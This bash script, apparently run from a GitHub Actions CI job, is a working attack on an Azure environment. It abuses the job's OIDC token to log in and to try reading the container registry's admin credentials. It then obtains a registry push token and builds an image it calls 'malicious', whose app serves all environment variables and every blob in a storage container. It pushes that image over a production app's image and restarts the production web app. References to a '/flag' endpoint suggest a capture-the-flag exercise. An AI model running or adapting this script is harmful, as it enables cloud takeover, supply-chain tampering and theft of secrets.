#!/usr/bin/env bash
set -x

az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true

# === APPROACH 1: ACR admin credentials ===
# If ACR admin is enabled, we can get admin user/password via Reader role
echo "=== ACR ADMIN CREDENTIALS ==="
az acr credential show -n crtblplatprodx3euoz 2>&1 | head -c 300

# === APPROACH 2: ACR login + push (replace app image) ===
echo "=== ACR LOGIN ==="
az acr login -n crtblplatprodx3euoz 2>&1 | head -c 200

# === APPROACH 3: Use ACR token to push ===
echo "=== ACR PUSH TEST ==="
# Get ACR token via OIDC
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
# Exchange OIDC for ACR token
ACR_REFRESH=$(curl -s -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
  -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&tenant=$AZURE_TENANT_ID" \
  -d "access_token=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)" | jq -r .refresh_token)
echo "ACR refresh token len: ${#ACR_REFRESH}"

if [ ${#ACR_REFRESH} -gt 10 ]; then
  # Get push scope token
  ACR_PUSH=$(curl -s -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
    -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:tebamoto-reporting-api:push,pull&refresh_token=$ACR_REFRESH" | jq -r .access_token)
  echo "ACR push token len: ${#ACR_PUSH}"
  
  if [ ${#ACR_PUSH} -gt 10 ] && [ "$ACR_PUSH" != "null" ]; then
    echo "=== CAN PUSH TO ACR! Building malicious image... ==="
    
    # Create a simple app that dumps env vars
    mkdir -p /tmp/evil-app
    cat > /tmp/evil-app/app.py << 'PYEOF'
import os, json
from flask import Flask
app = Flask(__name__)
@app.route('/')
def index():
    env = {k:v for k,v in os.environ.items()}
    return json.dumps(env, indent=2)
@app.route('/flag')
def flag():
    conn = os.environ.get('CONFIG_STORAGE_CONNECTION', '')
    if conn:
        from azure.storage.blob import BlobServiceClient
        svc = BlobServiceClient.from_connection_string(conn)
        container = os.environ.get('CONFIG_CONTAINER', 'config')
        # List all blobs
        cc = svc.get_container_client(container)
        blobs = [b.name for b in cc.list_blobs()]
        # Read each blob
        data = {}
        for b in blobs:
            bc = svc.get_blob_client(container, b)
            data[b] = bc.download_blob().readall().decode(errors='replace')
        return json.dumps({'blobs': blobs, 'data': data, 'env_keys': list(os.environ.keys())}, indent=2)
    return json.dumps({'error': 'no connection string', 'env_keys': list(os.environ.keys())})
PYEOF
    cat > /tmp/evil-app/requirements.txt << 'REQEOF'
flask>=3.0
gunicorn>=22.0
azure-storage-blob>=12.19.0
REQEOF
    cat > /tmp/evil-app/Dockerfile << 'DEOF'
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
CMD ["gunicorn", "-b", "0.0.0.0:8000", "app:app"]
DEOF
    
    # Build and push
    cd /tmp/evil-app
    docker build -t crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest . 2>&1 | tail -5
    
    # Push using token
    echo "$ACR_PUSH" | docker login crtblplatprodx3euoz.azurecr.io -u "00000000-0000-0000-0000-000000000000" --password-stdin 2>&1
    docker push crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest 2>&1 | tail -10
    
    echo "=== IMAGE PUSHED! App will restart with new image ==="
    echo "=== After restart, visit /flag endpoint ==="
  fi
fi

# === APPROACH 4: webapp restart to pick up new image ===
echo "=== RESTART APP ==="
az webapp restart -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea 2>&1

echo "=== DONE ==="
